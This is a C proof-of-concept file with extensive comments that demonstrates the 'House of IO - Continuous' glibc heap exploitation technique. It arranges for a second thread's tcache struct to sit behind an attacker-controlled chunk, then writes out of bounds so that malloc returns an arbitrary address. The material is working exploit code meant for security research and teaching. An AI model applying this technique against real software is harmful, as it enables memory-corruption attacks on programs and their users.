#include <malloc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

// Compile: `gcc poc.c -o poc -ggdb -pthread -no-pie`

/*
House of IO - Continuous? 
==========================

Our goal is to corrupt TCache Bin data structure itself to place a pointer to 
an arbitrary spot in memory. An extremely detailed writeup of this technique
can be found at https://maxwelldulin.com/BlogPost?post=6295828480. Below
has a description of the technique with a documented proof of concept. 

The TCache Bins are a type of bin that is specific to a thread.   
Here are some other facts about them: 
- Range from 0x20-0x410 in size in groups of 0x10 bytes
- Limited to 7 bin
- Singly linked list

The Bins themselves have two fields (struct is defined below):

	typedef struct tcache_perthread_struct
	{
		uint16_t counts[TCACHE_MAX_BINS];
		tcache_entry *entries[TCACHE_MAX_BINS];
	} tcache_perthread_struct;

The latter of the fields (entries) is a list of pointers to the beginning of 
the linked list for a particular bin. This is how the allocator knows *where*
to get the chunk from out of the linked list. 
The former (counts) is a counter for the amount of chunks in a specific TCache Bin. 
These both operate on the same indexing system. It should be noted that  
'tcache_perthread_struct->entries' does NOT mangle the pointers in the bin itself.

The goal of the attack is to *corrupt* the entries array in order to return an arbitrary
chunk. In the original House of IO (https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/), 
an underflowed write is used in order to corrupt this data. However, these types of primitives
are pretty rare, which is noted by the author of the original article. Since
this technique bypasses pointer mangling (encryption of singly linked list), it's a 
powerful technique but needed some refinement. The goal of this technique is to 
corrupt the entries array using a use after free, double free or buffer overflow.  

Heap
-----------------
======================
TCache Bin Struct
======================
First chunk for user
======================
Other chunks
........
======================
Top Chunk
----------------------


The reason the *underflow* bug is originally used is because the tcache struct is 
allocated on the heap when the first allocation for a specific thread is made. This
sequence of allocations is shown above in the diagram. In 
most cases, this is always the first allocation on the heap, making a buffer overflow
and several other primitives not as viable. Does this *have* to be the first allocation
though?

Heap
-----------------
======================
TCache Bin Struct (main thread)
======================
First chunk for user
======================
TCache Bin Struct (secondary thread) 
======================
Other chunks
........
======================
Top Chunk
----------------------

If enough threads are created (or some settings changed), the arenas (heap memory) 
sections begin to be *reuse* the arenas! Since the first allocation of a *thread* 
creates this memory, this now means that we can allocate a tcache bin struct chunk
that is NOT the first allocation on the heap. This means, with carefully heap feng
shui, we can put a tcache bin struct in a place that would suspectable to a normal
primitive. A diagram of this idea is shown above for the heap layout. 

This exploit strategy can be triggered in many different ways. The one key is that
we force threads to share memory with one another to allocate another tcache bin struct
on the heap. 

The exploit below uses a buffer overflow into the tcache bin struct while using
two threads using a crappy mutex-like system.

The flow of the program: 
1. Set the amount of allowed arenas to create to be 1. 
2. Allocate a chunk in the main thread. This forces the main thread to 
   create a tcache bin struct in the main arenas heap.
3. Create a new thread. This allocates a chunk onto the main threads heap. 
   This is the *secondary* thread.
4. Create a chunk in the *main thread*. This will be directly 
   behind the chunk for the tcache struct created in the next step.
5. Create a chunk in the *secondary* thread. This allocation will 
   trigger the tcache bin struct for the thread to be created on our heap. 
6. Free the chunk created in the secondary heap. This will 
   go to the secondary threads tcache bin struct.
7. Use the chunk from the *main thread* to overwrite data in the tcache 
   struct. Namely, we want to corrupt the singly linked list storage of the tcache. 
8. Allocate the chunk that points to the fake chunk. 
9. Boom :) Winner!


NOTES: 
- The 'counts' can be corrupted. If you cannot write NULL bytes, this attack 
  still works for some reason. However, the tcache is completely impossible 
  to add data into because of the corruption occuring that overwrites the 'counts' 
  values. 
- If you can write nullbytes or write multiple times, multiple pointers can be 
  written into the other sized tcache bins to achieve many allocations to the
  improper addesses. It's pretty neat! You just need to make sure that the count 
  for that bin is NOT set to 0.
- Instead of creating the chunk after the thread has been created (step 3), we 
  could create a chunk that is in the unsorted bin that would fit this 
  allocation size. However, this seemed easier than doing the heap feng shui. 
- For whatever reason, the usage of our fake chunk completely bricks this 
  program when the thread exits. 
- This can be used to bypass pointer mangling altogether to put chunks into 
  arbitrary locations.

************************************
Written up by Maxwell Dulin (Strikeout) 
************************************
*/

// Function prototypes
void main_thread(); 
void* secondary_thread(); 

// Mutex
int mutex = 0;

char important_string[0x40] = "Overwrite me!"; 

// Locking mechanism to wait for the other thread
void wait_for_mutex(int need){
	while(mutex != need){
		sleep(1);
	}
}


int main(){
	pthread_t threadId;
	setvbuf(stdout, NULL, _IONBF, 0);

	puts("House of IO - Continuous");
	puts("===========================\n");

	puts("The goal of this technique is to overwrite a pointer"); 
	puts("within the tcache bin struct itself, which is stored on"); 
	puts("the heap. To do this with a buffer overflow (or uaf or double free), we manipulate the");
	puts("same arena to have TWO tcache bin structs to overwrite"); 
	puts("a pointer to via a simple primitive.");
	puts("With the tcache bin pointer overwritten, we can return an arbitrary memory"); 
	puts("address as a chunk.");
	puts("For more information on this, read through the comments of this code.\n");
	/* 
	Call mallopt in order to set the maximum number of arenas to 1.
	Not required for a real exploit but it makes this significantly easier
	to deal with.
	*/
	puts("Step 1 - Setting the maximum amount of arenas to 1 via 'mallopt'.\n");
	mallopt(M_ARENA_MAX, 1); // Step 1

	/*
	Initializes theheap in the main thread
	We do not care too much about this allocation though.
	*/
	puts("Step 2 - Call malloc(0x18) to initialize heap for the main arena.\n");
	malloc(0x18); // Step 2

	// Creating a thread to reuse the main arena
	puts("Step 3 - Creating a new thread (secondary thread).");
	puts("This will reuse the main arena heap section.\n");
	// This creates a chunk of size 0x120 on the heap for the main arena
	pthread_create(&threadId, NULL, &secondary_thread, NULL); // Step 3

	main_thread();
}

/*
Functionality for the main thread in the program
*/
void main_thread(){

	// Wait for the secondary thread to start
	wait_for_mutex(1);

	puts("Step 4 - Create a chunk in the main thread.");
	puts("We need to wait until AFTER the new thread is created because");
	puts("a heap chunk is added to store information about the thread"); 
	puts("in the thread that created the process");
	puts("This chunk will be directly behind our target tcache bin struct.\n");
	// Create the attacker chunk
	long long* attack_ptr = malloc(0x20); // Step 4

	/*
	Allow secondary thread to create tcache bin struct for the thread
	*/
	mutex = 2; 
	wait_for_mutex(3);

	/*
	Prior to this write, this is how the heap looks
	Heap
	-----------------
	======================
	0x290 - TCache Bin Struct (main thread)
	======================
	0x20 - Chunk allocated in main thread (not named)
	======================
	0x120 - Thread information for 'secondary' thread
	======================
	0x20 - 'attack_ptr' allocated from main thread <--- Vulnerable chunk
	====================== 
	0x290 - TCache Bin Struct (secondary thread) <---- Overwrite in here
	======================
	0x20 (free) - 'trigger_tcache' 
	======================
	Top Chunk
	----------------------
	*/

	/*
	Corrupt the 'counts' array. If this tactic is done, all of the TCache bins
	believe that they are completely full. All allocations will attempt to 
	take chunks out of here. Leaving here as additional code to play with in the POC.
	for(int i = 0; i < (0xb0/sizeof(int)); i++){
		attack_ptr[i] = 0x55555555; 
	}
	*/

	puts("Step 7 - Overwrite the tcache bin pointer for the 0x20 tcache bin.");
	printf("Set the pointer to point to 'important_string' variable at %p\n", important_string);
	puts("From our attacker chunk, we performed an indexed out of bounds write ");
	puts("to overwrite the tcache bin pointer of the 0x20 tcache bin.");
	puts("Could also use a straight buffer overflow as well but is messy.");
	puts("We overwrite the 0x20 tcache bin pointer to be the address of the string ");
	puts("'important_string' in the .bss section.\n");
	/*
	!!Vulnerability!!
	Overwrite the tcache struct bin pointer for the 0x20 TCache Bin
	*/
	attack_ptr[0xb0 / (sizeof(long long))] = (long long)&important_string; // Step 7

	// Secondary thread allocates our 'fake' chunk
	mutex = 4; 
	wait_for_mutex(5);	
}

/*
Functionality for the secondary thread in the program
*/
void* secondary_thread(){

	// Tell main thread to allocate the chunk
	mutex = 1;
	wait_for_mutex(2);

	puts("Step 5 - Allocate a chunk in the secondary thread.");
	puts("This will initialize the tcache bin struct onto the same");
	puts("heap memory as the main thread. Our 'attacker' chunk");
	puts("is now directly behind this chunk, ready to go!\n");

	// Force the thread to allocate a new heap chunk for the tcache	
	int* trigger_tcache = malloc(0x10); // Step 5

	puts("Step 6 - Free the secondary thread chunk. We do this in order to increase");
	puts("the 'count' of the bin for our pointer overwrite later.\n"); 
	free(trigger_tcache); // Step 6 (not required if write through 'counts' array)

	// Tell main thread to do the overwrite of tcache bin struct
	mutex = 3; 
	wait_for_mutex(4);

	puts("Step 8 - Allocate our 'fake' chunk in the secondary thread."); 
	puts("Should be a pointer to 'important_string'.");

	// Return chunk of size 0x20 - Should be corrupted chunk from main thread
	char* victim_chunk = malloc(0x18); // Step 8
	printf("Victim chunk pointer: %p\n", victim_chunk);
	printf("Important_string pointer: %p\n\n", important_string);

	puts("Step 9: Cause havoc!"); 
	puts("The 'fake chunk' was returned to us. We will overwrite the string");
	puts("at this location with something else");

	/*
	The data inside 'important_string' gets cut off short because 
	the 'tcache' cleans up the 'key' pointer of a tcache bin chunk by 
	setting it to 0. So, the string is partially overwritten with all NULLs 
	after the allocation has been made from 0x8-0xf bytes. 
	- https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2939
	*/
	printf("Before write: %s\n", important_string);
	strcpy(victim_chunk, "House of IO Heap Magic\n");  // Step 9
	printf("After write: %s\n", important_string);

	if(important_string == victim_chunk){
		puts("Arbitrary chunk has been returned from malloc :)"); 	
	}
	else{
		puts("Hmmmm.... Something went wrong");
	}
	// End the program!
	mutex = 5;

	// Quit the thread without cleaning up
	// pthread_exit or a regular return will crash the program here.
	exit(0);
}
